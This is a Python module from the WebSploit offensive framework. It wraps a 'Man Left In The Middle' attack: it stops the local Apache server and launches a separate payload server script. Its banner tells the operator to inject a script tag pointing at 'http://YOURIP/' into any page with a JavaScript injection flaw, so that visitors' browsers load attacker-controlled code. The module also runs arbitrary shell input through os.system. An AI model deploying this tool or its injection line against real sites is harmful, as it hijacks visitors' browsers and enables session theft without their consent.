#!/usr/bin/env python
#
# WebSploit Framework Man Left In The Middle (MLITM) Attack module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
from core import wcolors
from core import help
from time import sleep
def mlitm():
	try:
		print ""
		print (wcolors.color.YELLOW + "[*]Written by Kyle Osborn")
		print ("[*]kyle@kyleosborn.com")
		print ("[*]This is not an exploit tool, it's a payload tool.\n[*]Once you've found the exloit, and you're able to inject javascript,\n[*]just stick this in there as a script.\n[*]<script src='http://YOURIP/'>" + wcolors.color.ENDC)
		print (wcolors.color.BLUE + "[*]Stoping Web Server ... "+ wcolors.color.ENDC)
		sleep(2)
		os.system('xterm -e service apache2 stop')
		print (wcolors.color.BLUE + "[*]Web Server Has Been Stoped."+ wcolors.color.ENDC)
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "MLITM" + wcolors.color.ENDC
		line_1 += " >  "	
		com = raw_input(line_1)
		if com[0:3] =='run':
			os.system('python modules/thebiz.py')
		elif com[0:12] =='show options':
			print "This Module Not Have Any Options, Insert [run] Command For Execute, Module restarting ..."
			sleep(2)
			mlitm()
		elif com[0:2] =='os':
			os.system(com[3:])
			mlitm()
		elif com[0:4] =='help':
			help.help()
			mlitm()
		elif com[0:4] =='back':
			pass
		else:
			print "Wrong Command => ", com
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
